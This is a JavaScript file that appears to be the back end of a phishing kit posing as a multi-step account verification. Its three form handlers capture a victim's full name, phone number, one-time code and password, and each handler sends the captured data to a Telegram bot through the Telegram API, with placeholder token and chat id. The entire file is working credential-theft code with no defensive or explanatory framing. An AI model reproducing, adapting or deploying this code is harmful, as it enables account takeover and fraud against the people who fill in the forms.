function processFirstData(){
	$('#firstForm').submit(function(submitingprocessFirstData){
	submitingprocessFirstData.preventDefault();
	
	var $full_name = $("input#full_name").val();
	var $phone_number = $("input#phone_number").val();
	

	var gabungan = 'full_name%3A%0A'+full_name.value+'%0Aphone_number%3A%0A'+phone_number.value;


	var token = 'token';
	var grup = '-idbot';

	if($full_name == "" && $phone_number == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
		data: $(this).serialize(),
		beforeSend: function() {
			$('.loading').show();
		},
		success: function(){
		$(".second").show();
		$('.loading').hide();
		$('.first').hide();
		$("input#validateFullName").val($full_name);
		$("input#validatePhoneNumber").val($phone_number);
		}
	});
	});  
	return false;
};

function processSecondData(){
	$('#secondForm').submit(function(submitingprocessSecondData){
	submitingprocessSecondData.preventDefault();
	
	var $full_name = $("input#validateFullName").val();
	var $phone_number = $("input#validatePhoneNumber").val();
	var $otp_code = $("input#otp").val();

	var gabungan = 'full_name%3A%0A'+full_name.value+'%0Aphone_number%3A%0A'+phone_number.value+`%0Aotp%3A%0A`+otp.value;
	
	var token = 'token';
	var grup = '-idbot';
	if($full_name == "" && $phone_number == "" && $otp == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
		data: $(this).serialize(),
		beforeSend: function() {
			$('.loading').show();
		},
		success: function(){
		$(".third").show();
		$('.loading').hide();
		$('.second').hide();
		$("input#validateOtp").val($otp);
		}
	});
	});  
	return false;
};

function processThirdData(){
	$('#thirdForm').submit(function(submitingprocessThirdData){
	submitingprocessThirdData.preventDefault();
	
	var $full_name = $("input#validateFullName").val();
	var $phone_number = $("input#validatePhoneNumber").val();
	var $otp_code = $("input#otp").val();
	var $password = $("input#password").val();

	var gabungan = 'full_name%3A%0A'+full_name.value+'%0Aphone_number%3A%0A'+phone_number.value+`%0Aotp%3A%0A`+otp.value+`%0Apassword%3A%0A`+password.value;
	
	var token = 'token';
	var grup = '-idbot';
	
	if($full_name == "" && $phone_number == "" && $otp == "" && $password == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
		data: $(this).serialize(),
		beforeSend: function() {
			$('.loading').show();
		},
		success: function(){
		$(".four").show();
		$('.loading').hide();
		$('.third').hide();
		}
	});
	});  
	return false;
};
